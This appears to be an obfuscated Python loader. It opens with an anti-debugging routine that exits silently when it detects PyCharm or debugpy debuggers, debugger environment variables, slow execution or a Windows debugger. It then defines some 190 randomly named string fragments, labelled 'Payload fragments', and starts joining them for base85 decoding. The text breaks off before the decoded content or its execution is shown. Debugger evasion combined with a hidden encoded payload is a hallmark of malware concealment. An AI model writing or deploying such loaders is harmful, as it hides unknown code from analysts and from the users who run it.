#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cp4fw2fj2IsBL_ = '{;_0`Gza}LZnt3|5ZLgNJdVMCCd^R>B|~*|)@wN{Tda!~{?USe#7$9c>s-3b'
_cfGbCq69CnX7Sg = 'y?QjA_{^?7l}!Ff!I*~h_dqNyc*`iLxf!~6M6gtwedLPlEqWI=cZ=MG)TRbV'
_cbO2vmgzLyFB_2 = 'f?d-^A_v$@p-BCaemJL1;fsNTovJy}5A9-WVhYshWq&x|?Ifvt*E+A)Ep>GQ'
_csTMoxIq9VtwfU = 'J2w3-q|DckF2XeiaA+^a#@OTrvG6y1w#*o`!vY1@9K%7i_Me%7?Q+z(-ei7P'
_cgQT8TR1svkB9b = '=B4-Jm5Io8Q{_b`>W?s`2Q9~-jf~$Z1mc%&mT{WbS^$gZ%P4u^`01f-iKgx('
_cihlDbQc75GV0k = '?p~6r+-G|^r8m)hwc7p7A)7_6tTWu2WFrhitdtLn-N*pu2nQB=@X1o&vSDTL'
_cfQ11ekzX848lW = '+9m`v3Bq<C!~e&=_>k(XOi!Z)PP}O&X5(tV`K%nwRvzx$uVjhMZsxIGgr!CT'
_cxTh5mXhf47rcE = 'J_BDkl9DNVah4d3c-ZEnJ{i<MW8Firh@W$5o0itzut9wf5U}ed>m&keYA`k*'
_csJcfDZggqK5Vd = 'HR0|;2Of0PsCVFa=4j4g{VtRcB`w0YK9b?qS{aSMNi9Ue=@IBDX?{g&rB|f>'
_cw7ViQh6TAdTMh = '21BMh{->($N&To2jI=7qh4s$CiKxtCFH{glAp?)nA*wGM=s|eXdR@?aE&>yN'
_cjZAirUzigWlkq = '6W|<v=evEtdUVT1-=FT!gJ_+mLYZgq)t{;w@`OMG`&yssq&}-)WxG-awrBL0'
_cwpqqV7oiXQkrO = '5W@&0`tin1SpAxZHp1(okq)={Y;2`D9pxf5tft@xwdQ)AFmy?aFy=D2c#FkS'
_co4G6yVVYGn9j8 = 'c?@ey+YtWAP(smlbSA<YheY9^hGO1<XjFVEI?B3aW1!u9C6lmU%BJ>$CYh1o'
_cpB_QOom8fUcAF = '9d@;vy9gfOWfvlPyOIi7WEuCuW#ua(=*^k1suu4=KsDZ7Z<>)q)p}=F4UY{&'
_cvAiHeOd241T_d = '<J!M_jw+N4lQ0x|r_JZ)va_yE-f*!x>b<-+p)W;TGr9Ya+pCGnP2E6Ig_QE>'
_cdfBW6IoXzYZC9 = '{;=HaG&%VO8TM?26W1WhmZ?Sq4oJmgJq8SxYAPpqPw{Fvy+n_6>>@MlyBC@X'
_clG_DN5O1vgvMP = 'AJGDh{uhTGG(Kw@aOxE~2m2VqCc3+x-e{MX%*P`~PsqO0Nh^mF6fWtrfhS7c'
_clna3_86w6_S7n = 'bH0=nRIch`7pX;`C(RhiVu}YNi(U(B4)|!V0`$a`^giQ(m+D<&H^>u5^#4OU'
_cokyVXvWLm5Ykp = '-p{VeU_tdIbb)V;K0}tlN_g1Kjv};hdvV^rM=;<zl5%du4ubHIK(e2@kHwMc'
_cekViDFXve0jhH = '#1rtJTLy=AOqO@J@@^lSH2GNvDx;=*j!VZ+Ut10{9;kEOn~QBWhr&yF0wFK<'
_coP0Ks26PplMfJ = 'V~K;^9AQP_fvzPJXz@dA?GRDrpkL3e`+Kpx_8S(y!qx7$BT8TP*x<d0BH156'
_cwVlyZOU0UfTiZ = 'zRk)FXdy~oY7(MGiV9#@oDvmTOLD?t`7Bp+{jjfve`)7nFA{G{q8WllsOEDL'
_cr7KkBjG0ACkDJ = '3AUlQUs0{<Kkh1$UVR;iPQet&DfT%qWoDmy`W!Q@AD&nx%;56Qe$vLv&I*%&'
_cbQNxl7iDbZw85 = 'cAmKR**WarlK>Ba%ebYG&zt4WjokeM2Cs9c>FPf_BgTGq?t>E6F~1)j^u%Xo'
_caIzs9gtIbCv6A = 'wM{j93Dm1po{?#QZlq7`y0By824|r^KN#~0Z&$-=4E)t$6xVFfU{z!$vfH~='
_czmxjPgIcEu22d = 'AQ~e<Ph7Ja1jJ3htA=Ifn;ASqqQrU|FyGJyC2Xy<;Am0kgg&+_gLie_@G6j^'
_ctsFcDw1h4XWOq = 'pg?!ML%70fls{`r<}aH}9~PefDj`9y-8wrr_vZc;EMtH8H^fyMDinW@h#L#q'
_cyIoPhysmQ0Q9S = '`vfnfch*<^ClqwfD^vM5XCo%^Z>MVbBp0*TmSCAxCOOb5)O^jI(zZnP1S(p3'
_celB4CNLmrNzch = 'yH7E@S<vKgbTXmbY>`QKP5&Bo1S_)EoF6!lY?wMPCWnHjOx3yuUMp9}EoDh4'
_cvTm0M0jgweBPl = 'fMJa*hkm(XJVJaxpghW3zfsApAwB0(yC7SXUYAG6J%&6IV77kRT0_YxXnYDh'
_cmYtFHErXWx9os = 'NSG&>w)M=5v{(f&UQ-GaX~8>iS1*q&ESK`;!g`8M`od|0>w`pKz-UFQ0q9UR'
_cqft0UPZf6eR3v = '<=Rm?hoW6x@?ifKVnk*<o`7b{;n#OilWIqR?ZbXhL}RHs`g1RoIFV`Ybo^>('
_cs_IsaU6mmZy64 = 'o=D_jmuMnoTg(~hyItIBfmhF}Ir1G3{E^K?9;2PUH+DWI_gHe_nZtFg#!6_M'
_ci0nJdexIWo4is = ')(H?fR#0#ufvconpS?PU6F<u9NuPyfFv-0~117CYQtrusN!xwC*~kE*Nwg>N'
_cb5JdHPdJbaIbk = 'ODD@d$(X<>;t{nn1xSR%MHht3ZQt>I!hvMLuOJ-Sbh-w!xr9YCmoB+b8~f|m'
_cjCdeLmMC1zPXD = '1da_NZ%#3;l=7`A{98kn_f)Mr4H>^j^9qQeQ@yJ2D|#u=<ATRJ1d~DW6{7*9'
_cviIrxK3lU6tPG = 'kksj6B4M~Ph{Q>DPK;<fAA8v6*+T5Wu)@4nt<h~aaT=uhn`}Uo5$?dbuRHBf'
_cfDMSyZabqDYAy = 'V5h@USsv7FEl)CV<FRsd-I^|#^aULAloGy@z?5GlWjk&WDbl(fohLOV9^0WA'
_caj2Cqxufn5sYN = ';FUx_2CPekYF&e?E9id_c$9`}m?QiiRKQW*+GRkmae?tZXLz&5a#XMk>o@Y8'
_cx3emKRhpotXR3 = 'v4LF`kPDXB3g({HI&No9VQ~0fvF;&cI^RzW?e}QR&LpZ}vc-`_0*tCY@5Wrt'
_cuWwHd35VI0fFW = '7k>7-OaggqxJAb;IOTm=-bXhq-`y5KBU(eeuuH3b-e*)tVqX5;qX~?bH*t8e'
_cbuRf0DI6HFwKC = 'U+p_c;1~@a<A+Kqa~}z!SvKg=t(b2SAXpwVLxR%z^je=&fM9OEcNH&Cfh-fa'
_ccaF5CPKhHdw64 = 'w98+7%%jveFG~?d`C0E*3~9(>tI4zC&`l@QyKs7#iB;q%Raf`BEAX&2w$bh%'
_czG0e_WMEZnQB6 = 'R@Gu*xCBI;-<9u9OGiKnD%>QrW6#@(ua(;$>iBV99F5YE$5&cnSBU?Dwnzf*'
_ce9fIVPDgv3TDT = '@zmOknfb$!<_1Mbi{$l`&zY}_H84d$>=TZ*aj%jUbj0iKybCBb$FN{4sKI{?'
_chb6QmnGN0LnXs = 'i?v{qApe6OsSiasN)Q(2*nNqI))oLCkgr@$!|dqulCIJC739|7Fpgg{b8Pmd'
_cxT6ePAJIYNcAX = ';>t&tQm<^coFZoS9Ywc<gg)hU4YTfSjG%(bkJ{mKYInjTPB@ngD}pImi~>~J'
_cxq8uQxaJLKYKM = 'S`b#?!gowvT5yxXNU(&{?5f)#{-<8kEa+syhGrCVCKPzR$G5bGMg2AdoNr+_'
_caNKxCv4fwhZeL = 'L92qbpn`wqoh8Xdj7sWzpxgYNjv?(9)l`Cb7d$DeHly772wTeqNCENnHldup'
_cjwrCFngcGcV8t = '_(e|=%`|q!HS<D?9j<5HW))9}bVC}}=&;(|b@@E>Yl}ASi-ej{3l1Gc+U2C1'
_cwfHusCoj6BmwK = 'O_I!;FA3wMQ?Gc<oUL*3iu_{k(mG?Mu8WWnNyo9R@=oc}L@(Z(q?%P6jI>+n'
_cq4qjYFwoMzJPN = 'chF%{u&i@*lSfZyiSGpA-4fn0sWpG=5^%~+GXk{pbGy-CDdkC&0M%inCrE@!'
_cwgVGf90EtImh5 = '@~b*Z5-$ELmM94Fi6{Tc9G-83y}vxCR^dv{XdCc{iR<pyl3L?e`S=(MH9jp?'
_cwA6QZw2tNhoSN = '=!D!6Sk*`uhQMvN^Cz;ywNuQux5ZClhK|KoWvqNqhfg)zQQ?)+YC1XZKFBz$'
_chqWFKJ52eZImP = 'd8A~~E-4nNf}Ty=QY4DqBQbZ3oB@Y9pREQ#ktl$mi_otTz(}$=O<4_YAn7+B'
_ciOvBZhwfAvHos = 'o+HaIJ$tkGv3{^2hkyQj3^vC!F%~S4pI=Wg3a@ONLuLbGp~i%%7cb%DWcp_@'
_cpn5dUYb5uflE8 = 'a43&2c_L-<rmX?s<J6Ic$X(+ewMOz+{TFpgAkHVMEsQ)G)F4%Ztij)OV)E3B'
_cb4huKBmr5g6jP = '|CYA0kel6ZY-N7dhNhmWKW6q|W@XzM#0m!+*3hcauX5*|^=?N368<l6XnR4R'
_cdxrvnyQ2pIJOb = 'Dlrs1nNG_4wGezMynHQs3>t~FHWeCx$y#9jl)FlbJge3u^B8iaEiEs@RFi&h'
_cgy_ureW7msAqu = '8^P>2kp$Bv4g@YVy{|GH#fLq+M9^;cp{#AMcTeM!Zs!EtE@Q)CZVcN{g^Xq2'
_cp0bswByW7Ez3f = '^tzO;TT-+zA_0jY+7yzv61}BSk#vT*lWw|Ox8~~{c-;vIO^=hLzv<1M23qr_'
_cbyvOMdiB1W46q = 'IkkAW{El6*88^kC)aas=*__PAU)7KH4=F*~@#FtDOqI@7ae3;rZrIQtkX+fV'
_cl8u2bSfewDvRA = 'B;BP;{lehX1COs+Zv6TmIRqH!>;Xx7C|p>z6|Eth@64X8Ud$au%3TL_*#?4b'
_cvQCCn6Sn0BerB = '==3n6*RiH}3kvx~BjOw_BD&NSDT%_tyht%QZ~{T*r~m@_ep{NCy*QSt{b#05'
_ccyafxSyspvUoN = '7q9f-EIT4LP~ps!V-PB?ggKQ6eq7*=FL~{}=t&8<dv@W-y2dgU&(5Hkm8{Io'
_cbiVCsWciD2tSc = 'fbocMv5G805P)Xu51F@}A4NT5R4+j!_>S_Ho{edRs{*k~Zxs|$RywPzbA6cp'
_ckZCAU_kC8ucxh = '8GdTY$TRmsMR@<yHzJp}>hsVN<vXdFMv|08t8bYy#xy3}`DJyK{b2|bNhi2N'
_caynRsxvTv_6Sc = 'EL+V{q--8}iAGmi`2N?5K`~_GDo1vg9Whg#{$KbOu`$@;1)nmy1&;sxi;SHj'
_ck6Nz7xzPRV80D = 'm*4>3io*ofAvkok9La{ghkoe~8?559ovs{ta=F)w)eKm^5w5vH5D=3QhQ){y'
_cnUsZT_fcVIcLX = '=lK?mOB3d}Re73jKmck%xD&6r^O7@W@4>ovxidrHG`ab9<+m?5d)L@T`WT#l'
_cal_KuKZJsOnaN = 'rI-8Wk3-%AS=KhP3JL7@#N$xmmvJqjlYvFfiA4-L#EPE^U(YK4aXuKoF4)`Y'
_cqaQhSuYysgNbl = 'Iv@Ma@yYlhvv#&6M{>Gg=2JfeBDoldS+J4^772*pI*rN+hab8uI3Y?aSBqMD'
_cvXYt5edUyLKEl = 'H<IJ^12gYjxzWiRE<m+f@{`~%u1iezYrF9J#%T`ZO&fEn{$kp%EeZXj^yi<E'
_czcBfcTpb4WW1i = '*)963#<xyvMKfqkhG;wb<-=vDq5!3A=&YvdfxolzuD=Pvfpg);q~9A|4C8I_'
_coo3EDziaZJwvk = 'c<+zeElETiPKvV?XYW_7pSGi5lgG(BPyS9kxJOWRwR;g}quyZ3>pHeC6t6tJ'
_cet6lQlgMDANcL = '4PG+INxP25hp1X;pjs-xF7nucw)|UJA0_9Qpq$}I(cgedrv8=pZOfvFE>W&Q'
_cuYl84vtKM6mJu = 'BePr+kQ{ZLL_)z;zrZa4+&<je805J9M3!q9OIfHuXtq(-ls_hWVQAt)T6E^}'
_clas4bREm6RSh2 = 'j=;>_R6oyj*ZM~#8<Kor(upW?(5Wfn9^0~T%w;!onZ%!>ZNJB4Mo0*?FiQR@'
_cjYWorQ1DAdneC = 'Y|fn_utS026AVPuIAYStztCd-b?D5SuqujhOk5*@2B3}az&WkKw8&NPuobjY'
_cp_pxx82FIne61 = '%NoI~V!3IrqvdS#3KpnUgKy<o^lJ^&1@hk*)V}QQCEz{?rEpR^RR>yLsMiWv'
_cn2NWcq0FX5znM = 'DzS_T1i2X43g#0Joi`3yHW)k13bMb3HEI2~XkbmlhkQ-(zr!|~`w<sku)0(+'
_cp1_TJI6AwfT_I = 'asN^<Blp?F;tQ99(x9%mzzfQhcP~Knze6rhlh>D-xokv?bU6+Q7-j<z3l`ll'
_cxLTYULutuEuEy = 'y2%a=-5B7qfe7EYptOL~Ib6`dv5u?VJ4g)$>%jYuz8|^cs?)mqZVm@{BWIG<'
_czWbQ5zKSg7VbZ = '>o#LBfEnQ5-7KnKmZNQt`!UVXu1sR<qfdQc8)*`DL`LWnksxYRHH_T~vk-s;'
_cd65_4uCRVtN4g = 'V?QG^8b@BD?OiQ;(6+0I3x>_mD_aPDl#~IRd-;SHUk-i7_vVrs(lFWlZTZ6c'
_cgVIl8FXvko_CU = 'K0LlA`zopHf?5e8rv>y;IMr$oA9v}Db^S5u>8RjV=`zp-zBQVA5;e>$qxL7w'
_ca9CILdb4r7W8Q = 'bh?R>h3JCh{#lgfq2vG4i-zc-CAkFLeHhxfsf+Wyv~MDMx#J5tZJy3xeAtRK'
_cpBmsqsIajrAFK = 'Bc?(LfgBV+g$>RUo4;`BSoV{;P|Uj)K?x!L<iNQk2L~sBi`C;xFvHB0FGw(='
_cl72Ltlowyf_6O = '{Tpx=+=yDwCQ68y$9X;T<u|Z->1<<{q<r8Lqk2dSw4f24e#k`BHBpjiJ3(bT'
_cv7_xo5k68XpiL = 'dv&0NJVUyz0Cb$Et0p=?937D77jI^R3TIuX0n2;>3Lp^V6}$aRUl0Vz&%XTg'
_cex7YvKbnq31Ot = '5#9D{%T57&kc-xz{d9zlYM_60z&*^zRvAEDQd2R_Hy3k{KT2YqO6guUm!)^U'
_chMng_zYD4ontB = 'vY%)}t@DZ5I;$;2D}+sUek_lC&es^ta?~wy?XbP>cA5ddJTZzY-l7=h+DqM|'
_cx4WA19wLxrniA = '`?qEA;K^aiY<#+Iro#d)Pb`QIF>lf=4_xEUQcXbAs>%)~?6Xx;o7mWOlCB1~'
_coQLJNmxhlhuoZ = 'YSYb+iMlZ}CE;n@-U?QT(pSWkGPs*Ei2s%!o~Lg`IKHg{s?IV<m0G@0Wec&A'
_ccj2zODxQZ7wy0 = 'OE8i>-^N!Qf}{Zub&@w-hfU1?_U~T%zLl7*2^m&k`?Oq{apXe^45`lDc<v)?'
_cr9z1i0Ts5CmxS = 'R1eC2yPsfD;#JHIcrmAI0a$IHe#*>fl1T!s$V?nd>>(uco>-sb%{;S%7|X{%'
_ckA03bXJpTdzRc = 'JY-$5oin(BX$q6^QBfM)mvFUHeLd~q0bB>yA5*<mP6O}(FwK4q`|-y>6`qkm'
_cpwV5KUgtqwUVS = 'pH4~aY-ey$rKy}yJ(y(a)Mv-9eNxu}s0in2F>5S>$elHm8}uJux#M@~QFu$*'
_ccoWmhNVkMMk2E = 'VtAj5V2U-~rxQ#=BleRKuWzC?dOre^-8cuKr?Ze5awUu8p+lruV4Dw4?3VvK'
_cbcvHiKF_qp2BX = 'vl0rd=uSUpf3azTnE@JvfmS()zObj`@e$XMg<QEB#j_<tts56t8#rf}boxf`'
_cfzKwWCW9O0uNN = '>JN;!UJ-ZTlaD7ZBT%+ImC&(ACie=cq3!KFq=dya^3<eT?ZJR-M^NPbTJomR'
_cy6cLS4X32LJY6 = 'VcTUNuxIGHh*JwnH7<2XZV2B8wf2?WU$ShH!gtfd2Xv%$nDwpXOZ1pMt#!-;'
_cfA61XHv_ePHHJ = 'eBUm?++Wn16jV_4*ClcrXf^FHbxG3Vn5Xr}m~Da(>4yafo0W691h;GUE^#KZ'
_cjMgPoI3EiW4kV = 'pvcIs8PPH0yf{X4f*V?2XCLbbsZ9g%Z2&%R){uA?%|}cY6;0l`%KF%h{i{?d'
_czAd1o759inhtW = 'om9;z!(#k}(N6lHK4^lQ<oP0qf@oxRjT}N98ft}CXlIkrx&-gbCs>jR9h_FX'
_czHmz836XzvITi = '!26IRz>RXDWC<s$gs*}?^1{cI%C5^1b9O}xd(9;0D!9l04%josKAv~JLKy6z'
_cnEMUslJLBb5sX = 'nqc=EN!{=7@|s|<ijsZa=T}&40OUy6%qR;Ow<}0yg#+Dgd{5W5BXK({2Okr$'
_chN5MrgQ_y30z4 = '3E=VSrk%q?bx#w6^GMF<vc2I101y+}KNXnq2j0ImnlW%jcOl5;_XvKLB9Y^<'
_cptwIJHdpqGQWb = '#gTZXY!h7p=io%=gFf;CY?`N~O2eoThre2M40yDA05D__n~5)`^9l03>xJ$_'
_cvsOQXhcBMINJo = 'T$#=m%7n(m<b-MkYyI_a>G>#RY7qUe*yqEOCk1^7QaN#zTB(0w)o()kbY7;&'
_csb4tuQr_yc3wI = 'c`pM(ebgV1NV1E7Xgdj*H~dvb76nV>z(;D83AMDZ*}voodyAK)N65^Hmokx$'
_cxEBp25Y9cgEnu = 'W#`8broR5w>M3ghaEW{anXnJmGVMR+c7nz!j^83zJl0>fTdj!QP%P~q%M*pq'
_csugG0LkhOqaQr = ')7@0!sqT$lcM?)BvKoskJPDV~?7p~vt)!=w(k$M>{}v+8nLctTJ>~~o!Z;%I'
_cfgHEgvbXMftu6 = '>Otxszv0+sXg5Dt>40AE`4J<uKt?k%qFlon(>RAm*JT&(@S&oS$VoZ^6EHFj'
_cu0ZJ8GxSEQCNi = 'M#;hJ1l%OT(MVl3fald-LJM4keQLi&N|QlqsSJmG(2&_%0UT%wglkFF8pwS*'
_celRtN9Aw4Dxec = 'Bs<?LV;&2TJoc#;Bic>{L=)%v8F4l4CcZuhVfv4c0-iFcTv9Cvp$p7{-#mUr'
_cm8No6eDAaddqR = '()}F!<YQv<^3@RxB}B67<bM@d!QzBCLcf6f63p_A6yQ&7{s$NhSrVcE`GLGs'
_cn05iUVBjszecp = 'd_i5=9aFrXs#YGIChF#BNQ<)gk!z9?Vb<^kcC0hZMzslo@zi-j4_->4(yNPe'
_ckBkWXqGAki88m = 'X66aQT<8~kMx*J)i<d}}5N;lFC5}l)Jv?{CS?GbZ8Y?2a#fA*$lLSK(#vCI$'
_ckYvleylubQrKI = 'vsI^+=o;RsU?L2&X?&P}<&NDLMTe}O?BeuUOd+SBnagBj`Hb&%3n3l|QHucj'
_cwYXcPv5VPcr3a = 'e=QfM-BBOs`wbsAOn!<=XO^rb@EI;8p1oUWRs2vuJbg(2(xvsVqHUYJaYLSg'
_cqQxmi7fK7_XxH = 'aIAaJBNTmlKAGc|L^<|J`Xcjl-?u6&2fK#q0G#vDUTYrrru~v@D>dwDrY1D~'
_caKXV9GniUzXD1 = 'fNr8EI(FLd|Ly3nEd@U2;nL3@tmTdDjl$DCoEk+=gM!Mu14;cShw9S=S=v(v'
_ccGzbqvliVBnxx = 'lUHzBVu|}=Z+jcNMlhJZnQA)*N8E4k3?aaE?!~ZdZ05N*W!p8$MhPT58OmZE'
_cuF_BUgJKUUIMH = 'jim!HK5!OQ^`%Qm=1)C~s^@zHEn;KJBj@!o*yPAShv>hvwiLbhXr}5Ag&QFY'
_cfSdhyKMxDZmu5 = ';>d(inug=E(;&wAAQxg<(1GL-)LUe<4r#tSMfd648hmQ8Q}l8$SfEq@?P^t0'
_cfewEYCieUQDMq = 'k#~gBy&saal#Q339PKMPN2gO7cG%nreF4A#6$WyAA)n%e*TrB7U2%a#G$oyf'
_cjU2E9wGFF5_8A = 'B;0lB%dGm_*k8VozVv0X$i95$wY-Jc_)Ai9SoNzX6MyN&&T5M?!SSm8$qW?B'
_cgByp6TXDkyKOF = '!0oO)W_1`EtyB&r>Sg&gY=)NDyf^hLB<?k+&Cs6Z{EZ&KPTcJoq<;o~0dGTm'
_cj6HuLEPExu75Q = 'Oc+w86uW7k<xTzp51MHLwE-qe2_K-n=RejA>r(ekddsC^^h9EU{}11$wXI+$'
_cqM1zD7VbR16yb = 'f`hJ^DROHcoN`SQAK8Vd<O6lgCb2bjj(f8gd-(8%=WZ?7Lq#1I*W~Qp^xfg&'
_cdSpCoIzZvDSMD = '%e`R|t_zECW0?7FNW66^4Ugn`z4co1bwe-gU7blw%(`@#Rgx&aF*6^E>cQ=O'
_cbZLXXT5AQ8FBn = 'S3jv8)rrx`^9>dodt<4KD7j<Ez!sKygaHet37)C$WjJ#D^U&D?*Mk2h?Gnzj'
_ch11SuhE9Di94k = 'N~(5>jO6h{u4+BIY1<j8xQ_$}v5ti6q%OC}fOn%8=#bIzkv`qeEkd{RACw9W'
_ckNMnG1bpycEBz = '&uEhI!G<M636v;oR32kK%}hzNn~k7=Y)`V5P{O!~f_5{F6F4FJ_aWgH*geaH'
_cfdHRyE3dxttd_ = 'TJD_P-T2Fdg{8<KR1sCywkjf+E+Kd^uE~+l9?WUM@XQX*Hz}NUXbjwh{<xIy'
_cqn9PezTL1lxPT = 'Qd>UkWW7dZG8zBq7qGRoO!3AFIfkMNWB{?pbF>v(ra4y#_4OAJYC*2HbkJ!l'
_ct8T6BoHOmhpcb = 'b;i(8eJgl`ze^9d_Ss|!jI+5vR{ynz0NQ!zEUfoG`+kr>(3GEH>hxSH+%SUV'
_cgrnvVwK6WiQx2 = 'SJa$2DSVjRwkn`Q@9+c6q(56-RM)f&Y=fcD(BiN}E@1Z{?v8}R8Z@$uj@JW&'
_ccELWXBKHqE0UR = '61p=HGY($rxhi07e(qaNC~{z4b(^0a8~eZb-BqY8^V+uo!v8c?0bu>4QCdh2'
_cek9RBuFT33rOi = 'G<)3w|7GOR+Tg|($65VRg7@K+zr=wJjgALQfw{9AXdF5+0z%QGP}}O12=p2u'
_cjKxFaJFNT6XfK = 'A%+RLQF~De4aj*F{f_TicUKu*zQ`lBq@!gxu1D_3_lM&oJZYKe{+?y%Csl^S'
_crgWCBieMfxlG0 = '9WiKF$rW(i{G7z2s_u9Q+w;3+z1U+v&>vgYJ*<KAnP$@6YLd|gwVF1X+i#Lv'
_cm6AI0CwmdlWj7 = 'Hv2{!VnJpbcajMp$|3$Ng)>M%lp>J!cbl(4?^*z4zfmTMRT6z73`Fa1OsjWD'
_ctKo91n8s_mr1A = '2e+HT6Z^AWTAqY!-+pBL>_c(}l}~~$W4aX$rvfoSV#FAlnBAHr+%UKfglRn$'
_cg73kqSTLatENC = 'ycY%k$jG~M4+2)nqwauX1?zUeZ1mTD!n#;}o>ppKl42#9;B_)jrFiAp3wGW+'
_cc2h941h2S4AzC = 'zJO8YCN5wFxKP|``5~wHxAZ#klAfUqMozh{%|(tbx`Q->A=;lTVQ`Q9K<JkV'
_cignD2jMnJUnv9 = '(dCGn8@!tLXkVcG_Xot@f_#~WPQB;Y(j6=m*^F{s=Zq6LaM$ejzlH^#ZtA#7'
_cg6HGc3a43KUHT = 'PwgM@4~<^7yGNe;uRk&@xW+0Hh>pH=D~AxB=}0p+?ioSck!x%dUY~oa2^t7*'
_caOHuQCxG2YtKt = 'b(^S?|9ulmesEY2!~3s&k1plk3TSYT%n2$WxVj-313!3UrO(_SsTpmXl!gWV'
_cwuCbzkGwM67RD = 'wP=02e~JHn>*W5EyRqwAoBZr66>Cg^vU~4Sc0HHdD^0oT9^<11(vAtAelTY_'
_cnkNrroIkxjoD2 = 'mm|!wVAfj0F}ZU1Iz_^S?ogxn#7Eg)|3~hR*L=G_ng4z3W}kV6U&raIjoB{O'
_cwpSYl8353CAsc = '>N*yr)}7)v5#go#L=Lv2>a0J4Cuq?jmwv{sx5N{XX?&?evF1(MUr^1=y>ws#'
_czB1toSQ0hljEb = 'pKT=V@CcH}^x^ri09cSocJxZk!OP^?pU&B8N|pnQE~1NC5HH_&-F?kfh&9OO'
_ceEjdDRXfBizQF = 'Y1vuYTn6kpKc4|TSj{cD(O^rw#-^BxcCe<I<nj;hm1cEk_m%-AG3#9|9<=zr'
_cws0riksKlRNDR = 'fQPq>=F6H|7VgEh@H=3TsQ;))Y!liK=e(sLvdYu`Up6C&1&1S>GKdXp$Q$Aw'
_c_MHaI8B7Pltt0 = 'XhwuTt)xlqE92*e4V`cx%3zDuj!k4D4vIvXE#4HY(61&n&}VrjV)ZK=i;zfo'
_cxAmXYntPYMyQP = 'RzLgb$<A%6IQaG=f{5fLW#o0?yE3|5-(&*JHat2&l4OFwlz_U~R5}NvZ`%Ye'
_cu5YSzOkQng4GW = 'oj;SzS=vt{)f(CiWH(1tMxaK^qR8jMdc<TaGZO3Rju#BdfxBsjI($ZRz+=vr'
_cm1D1tE5hNqo4k = '*iCMiRb*fpxKwRp5uI}HyFaa9BfyST7n2vKm{t4$HB^u7Rhhca_Byg+)TE&p'
_cmUMiRAioM673C = 'v0ZuHp<A8-2X!j`(pnPdjr3VjPZ0{9SBwW!=8n!#59>{NTQdU_dD5ArRruwp'
_ceUefMOPwhx6wB = 'HlI!yCV70M^1m9MNHI}(Nav73eUd=Jb_J+2qTXtvi@D9jSO0b{9n^=@`Rmw~'
_cjak1fW69MR2Uv = 'W^NXC*h{t1_LCiD)Zhb=C%HeN)Ug6qaeoR^N#8O8Ob`mpv=>D*xfKe~3H18g'
_cvuaMbBSjRZumj = 'XLgVlD^_C@vTU^B5R@V0kh@%kX@;9DWnNZx`=?i#;|l>`_2auRW~zOX^leZk'
_caMDxXKk3eukiL = '5G`93&n~DXNeKQwh6BmP$HDCPb;6mA3as&t!Q0-IIzH9ifyNW|fh;=wfyFHI'
_chhBbWPWEiVTpO = 'fB=anSal8O!a~kLogl{{Qz)4$8@c0S5#@)+zEW;_2c*0KU7~0bQ1)ug?W6r^'
_cpa98eNE0qLRyi = 'EYjGk_EFA)E?=x?HzDlxS(Y+W!5uSx=8_ue*}O>aNk&5zEKYsX&qzS9=M;UO'
_cu1FJNMe0zOmEU = 'Ow^yxCqa0abh$bWT*=7J^yGm4x$3)kMAjKNtYn0#hy(aXzZ1hK1%@Oy>`D!h'
_cl_S6wTHgZinfr = 'd%fYy0aZyszr+Zmqbe5(pP?3abw2L)G6^-!J}?CYudCZ8BEp%f-=rf37V8|I'
_cnmHigEXi4_xA7 = 'rFt;Ly_{M&Z;6Lwo@~!QlcF!S;w!eDQuk6mh9tLHX%YbFL4m@x@W@}PUR9^l'
_cxzhJbeTphonVS = 'f1Ao|*s|y%*6TXi_PO@m2?Jae>M8Dz(DuOJ`h#mZ#rV@sC&v(B`y?3{>2JrX'
_cn2BkwMPXb6eXV = 'C?>g}sbrrAFBEMFO9B0Yhk3QO_i44%#_diaQ^Tx}L?ts3#`M$W8J7&yr1d{`'
_clBkaFWCTBZ4_Z = 'pt+}1WcN)RYpWTQbVH7ZZAg%(l6D{<TtMzAf}w)VI#om|@0Vi#Rn<7JiWN`f'
_cjam_uP03SUqVi = 'hZLa3%!v1$'

_pq8xcavUS4GRpj = __import__('base64').b85decode(_cp4fw2fj2IsBL_ + _cfGbCq69CnX7Sg + _cbO2vmgzLyFB_2 + _csTMoxIq9VtwfU + _cgQT8TR1svkB9b + _cihlDbQc75GV0k + _cfQ11ekzX848lW + _cxTh5mXhf47rcE + _csJcfDZggqK5Vd + _cw7ViQh6TAdTMh + _cjZAirUzigWlkq + _cwpqqV7oiXQkrO + _co4G6yVVYGn9j8 + _cpB_QOom8fUcAF + _cvAiHeOd241T_d + _cdfBW6IoXzYZC9 + _clG_DN5O1vgvMP + _clna3_86w6_S7n + _cokyVXvWLm5Ykp + _cekViDFXve0jhH + _coP0Ks26PplMfJ + _cwVlyZOU0UfTiZ + _cr7KkBjG0ACkDJ + _cbQNxl7iDbZw85 + _caIzs9gtIbCv6A + _czmxjPgIcEu22d + _ctsFcDw1h4XWOq + _cyIoPhysmQ0Q9S + _celB4CNLmrNzch + _cvTm0M0jgweBPl + _cmYtFHErXWx9os + _cqft0UPZf6eR3v + _cs_IsaU6mmZy64 + _ci0nJdexIWo4is + _cb5JdHPdJbaIbk + _cjCdeLmMC1zPXD + _cviIrxK3lU6tPG + _cfDMSyZabqDYAy + _caj2Cqxufn5sYN + _cx3emKRhpotXR3 + _cuWwHd35VI0fFW + _cbuRf0DI6HFwKC + _ccaF5CPKhHdw64 + _czG0e_WMEZnQB6 + _ce9fIVPDgv3TDT + _chb6QmnGN0LnXs + _cxT6ePAJIYNcAX + _cxq8uQxaJLKYKM + 